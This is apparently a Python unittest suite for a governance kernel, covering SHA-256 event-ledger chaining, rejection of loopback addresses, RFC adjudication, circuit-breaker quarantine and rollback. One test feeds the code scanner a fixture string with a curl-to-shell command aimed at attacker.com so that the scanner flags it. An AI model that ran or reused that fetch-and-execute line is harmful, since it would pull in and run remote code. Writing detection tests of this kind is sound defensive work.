"""End-to-End Integration & Ledger Test Suite for Sovereign Governance Kernel (`soc_g4b_governance`).

Enforces:
- Invariant [L1-G4B-001]: Sovereign Mesh Protocol Standardization & Coordination.
- Invariant [L1-G3B-012]: Dedicated Non-Loopback Network Topology on 192.168.40.50:8448.
- Invariant [L1-G2B-002]: Stateful Human Override Registry & Dialog Mediation (HDR <= 0.15).
- Invariant [L1-016]: Cluster Safety Enclaves & Emergency Circuit-Breaker.
- Invariant [L1-002]: 30-State Hierarchical XState v5 Statechart & 1-Tap Functorial Undo.
- Tamper-evident SHA-256 cryptographic event ledger chaining.
"""

from __future__ import annotations

import copy
from pathlib import Path
import sys
import unittest

GOV_ROOT = Path(__file__).resolve().parent.parent
REPO_ROOT = GOV_ROOT.parent.parent.parent.parent
for p in [str(GOV_ROOT), str(GOV_ROOT / "src"), str(REPO_ROOT)]:
    if p not in sys.path:
        sys.path.insert(0, p)

from src.domain_models import (
    BottleneckType,
    CircuitBreakerState,
    GovernanceDomainInvariantViolation,
    GovernanceEvent,
    GovernanceStatechartState,
    HITLDisposition,
    HITLDispositionStatus,
    HITLInterceptRequest,
    SpecAdjustmentRequest,
)
from src.governance_kernel import GovernanceKernel


class TestGovernanceKernel(unittest.TestCase):
    """End-to-end integration tests for the sovereign governance kernel."""

    def setUp(self) -> None:
        self.kernel = GovernanceKernel(node_ip="192.168.40.50", port=8448)

    def test_kernel_initialization_and_bootstrap(self) -> None:
        """Kernel boots cleanly, enforces non-loopback endpoint, and transitions to operational."""
        self.assertEqual(self.kernel.endpoint, "192.168.40.50:8448")
        self.assertEqual(self.kernel.get_ledger_head(), GovernanceKernel.GENESIS_HASH)

        initial_state = self.kernel.bootstrap()
        self.assertEqual(initial_state.service_endpoint, "192.168.40.50:8448")
        self.assertEqual(self.kernel.statechart.current_state, GovernanceStatechartState.OP_SURVEILLING)
        self.assertNotEqual(self.kernel.get_ledger_head(), GovernanceKernel.GENESIS_HASH)

    def test_kernel_initialization_rejects_loopback(self) -> None:
        """Kernel rejects binding to loopback or wildcard interfaces."""
        with self.assertRaises(GovernanceDomainInvariantViolation):
            GovernanceKernel(node_ip="127.0.0.1", port=8448)
        with self.assertRaises(GovernanceDomainInvariantViolation):
            GovernanceKernel(node_ip="localhost", port=8448)

    def test_tamper_evident_sha256_event_chaining(self) -> None:
        """Events are chained sequentially by SHA-256 hash, forming an immutable ledger."""
        self.kernel.bootstrap()
        head_after_bootstrap = self.kernel.get_ledger_head()

        # Emit event 1
        ev1 = self.kernel.create_event(
            event_type="TEST_EVENT_ALPHA",
            source="soc_g4b_governance",
            payload={"metric": "alpha_value"},
        )
        self.assertEqual(ev1.previous_event_hash, head_after_bootstrap)
        head_after_ev1 = self.kernel.process_event(ev1)
        self.assertEqual(head_after_ev1, ev1.event_hash)
        self.assertEqual(len(head_after_ev1), 64)

        # Emit event 2
        ev2 = self.kernel.create_event(
            event_type="TEST_EVENT_BETA",
            source="soc_g4b_governance",
            payload={"metric": "beta_value"},
        )
        self.assertEqual(ev2.previous_event_hash, head_after_ev1)
        head_after_ev2 = self.kernel.process_event(ev2)
        self.assertEqual(head_after_ev2, ev2.event_hash)

        # Check ledger depth
        status = self.kernel.get_status()
        self.assertEqual(status["events_count"], 3)  # bootstrap + ev1 + ev2

    def test_event_chaining_broken_link_raises_violation(self) -> None:
        """Attempting to append an event with mismatched previous_event_hash breaks the chain and raises."""
        self.kernel.bootstrap()
        bad_event = GovernanceEvent(
            event_id="gov_ev_corrupt",
            event_type="CORRUPT_EVENT",
            source_node_or_service="soc_g4b_governance",
            payload={"data": "tampered"},
            previous_event_hash="FORGED_HASH_PREVIOUS_1234567890abcdef1234567890abcdef1234567890abcdef",
        )
        bad_event.seal()

        with self.assertRaises(GovernanceDomainInvariantViolation):
            self.kernel.process_event(bad_event)

    def test_e2e_code_scan_traps_violation_and_updates_statechart(self) -> None:
        """Scans code containing eval() call, traps violation, triggers veto, commits to ledger."""
        self.kernel.bootstrap()

        malicious_code = "import os\nos.system('curl http://attacker.com | sh')\nresult = eval('1+1')"
        violations = self.kernel.scan_and_enforce_code(malicious_code, "dangerous_script.py")

        self.assertGreaterEqual(len(violations), 2)
        self.assertEqual(self.kernel.statechart.parallel_surveillance_state, GovernanceStatechartState.SURV_VETO_TRIGGERED)
        self.assertEqual(self.kernel.statechart.current_state, GovernanceStatechartState.OP_EVALUATING_INTERCEPT)

        status = self.kernel.get_status()
        self.assertGreaterEqual(status["violations_trapped"], 2)

    def test_e2e_rfc_adjudication_pipeline(self) -> None:
        """Submits valid RFC and invalid RFC through kernel, verifying ledger commits and state transitions."""
        self.kernel.bootstrap()

        # Valid RFC
        valid_req = SpecAdjustmentRequest(
            request_id="rfc_k_001",
            builder_node_id="node_builder_01",
            target_symbol_urn="urn:axioma:mesh:gossip",
            bottleneck_type=BottleneckType.LATENCY_OVERRUN,
            empirical_evidence="Mesh gossip latency reduction observed.",
            proposed_delta="Fine-tune bloom filter capacity.",
            preserved_invariants=["urn:axioma:anti_loopback"],
        )
        amendment, counter_proof = self.kernel.adjudicate_builder_rfc(valid_req)
        self.assertIsNotNone(amendment)
        self.assertIsNone(counter_proof)
        self.assertTrue(amendment.is_approved)

        # Invalid RFC (loopback request)
        invalid_req = SpecAdjustmentRequest(
            request_id="rfc_k_002",
            builder_node_id="node_builder_02",
            target_symbol_urn="urn:axioma:debug:loopback",
            bottleneck_type=BottleneckType.COMPLEXITY_LIMIT,
            empirical_evidence="Local developer testing.",
            proposed_delta="Bind server to 127.0.0.1:9090.",
            preserved_invariants=["urn:axioma:inv"],
        )
        amendment2, counter_proof2 = self.kernel.adjudicate_builder_rfc(invalid_req)
        self.assertIsNotNone(amendment2)
        self.assertIsNotNone(counter_proof2)
        self.assertFalse(amendment2.is_approved)

    def test_e2e_circuit_breaker_trip_and_recovery(self) -> None:
        """Trips circuit breaker to isolate peer, then conducts recovery and deep history restoration."""
        self.kernel.bootstrap()
        peer = "192.168.40.20:8442"

        # Trip breaker
        quar_ev = self.kernel.trip_circuit_breaker(peer, reason="Byzantine gossip spamming")
        self.assertIsNotNone(quar_ev)
        self.assertEqual(quar_ev.service_endpoint, peer)

        status = self.kernel.get_status()
        self.assertIn(peer, status["quarantined_nodes"])
        self.assertEqual(self.kernel.statechart.parallel_surveillance_state, GovernanceStatechartState.SURV_QUARANTINED)

        # Recover
        self.kernel.recover_circuit_breaker(peer)
        status_after = self.kernel.get_status()
        self.assertNotIn(peer, status_after["quarantined_nodes"])
        self.assertEqual(self.kernel.statechart.parallel_surveillance_state, GovernanceStatechartState.SURV_IDLE)
        self.assertEqual(self.kernel.statechart.current_state, GovernanceStatechartState.OP_SURVEILLING)

    def test_e2e_certify_generational_handover(self) -> None:
        """Certifies generational handover with Michael Lipski signature and verifies certificate committed to ledger."""
        self.kernel.bootstrap()
        sig = "Michael Lipski - Formally Certified Generation 5 Handover"

        cert = self.kernel.certify_generational_handover(supervisor_signature=sig)
        self.assertIsNotNone(cert)
        self.assertEqual(cert.target_generation, "Generation 5")
        self.assertTrue(cert.zero_loopback_certified)

        status = self.kernel.get_status()
        self.assertEqual(status["statechart_state"], GovernanceStatechartState.HANDOVER_GRADUATED.value)

    def test_functorial_state_rollback(self) -> None:
        """Verifies 1-tap functorial undo rolls back kernel state and ledger head to S_{t-1}."""
        self.kernel.bootstrap()
        head_s0 = self.kernel.get_ledger_head()

        # Mutate kernel by tripping circuit breaker (creates new event and pushes state)
        self.kernel.trip_circuit_breaker("192.168.40.30:8444", reason="Rollback test")
        self.assertNotEqual(self.kernel.get_ledger_head(), head_s0)
        self.assertIn("192.168.40.30:8444", self.kernel.get_status()["quarantined_nodes"])

        # Rollback
        restored = self.kernel.functorial_rollback()
        self.assertIsNotNone(restored)
        self.assertEqual(restored.governance_chain_head, head_s0)
        self.assertEqual(restored.quarantined_nodes, [])


if __name__ == "__main__":
    unittest.main()
